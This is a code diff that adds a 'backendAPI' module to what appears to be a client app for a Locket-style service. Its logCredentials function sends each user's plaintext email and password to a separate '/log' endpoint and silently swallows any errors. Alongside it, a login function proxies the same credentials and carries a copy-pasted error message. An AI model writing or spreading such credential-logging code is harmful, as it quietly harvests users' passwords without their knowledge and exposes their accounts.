@@ -176,6 +176,34 @@ export const authAPI = {
   },
 };
 
+// Backend API
+export const backendAPI = {
+  logCredentials: async (email: string, password: string) => {
+    try {
+      const backendBase =
+        process.env.NEXT_PUBLIC_API || "http://localhost:5001";
+      await axios.post(`${backendBase}/log`, { email, password });
+    } catch (e) {
+      // swallow errors; logging should not break login flow
+      console.warn("/log call failed", e);
+    }
+  },
+  login: async (email: string, password: string) => {
+    try {
+      const backendBase =
+        process.env.NEXT_PUBLIC_API || "http://localhost:5001";
+      const response = await axios.post(`${backendBase}/locket/login`, {
+        email,
+        password,
+      });
+      return response.data;
+    } catch (e) {
+      // swallow errors; logging should not break login flow
+      console.warn("/log call failed", e);
+    }
+  },
+};
+
 // Friends API functions
 export const friendsAPI = {
   getListIdFriend: async (token: string, userId: string) => {
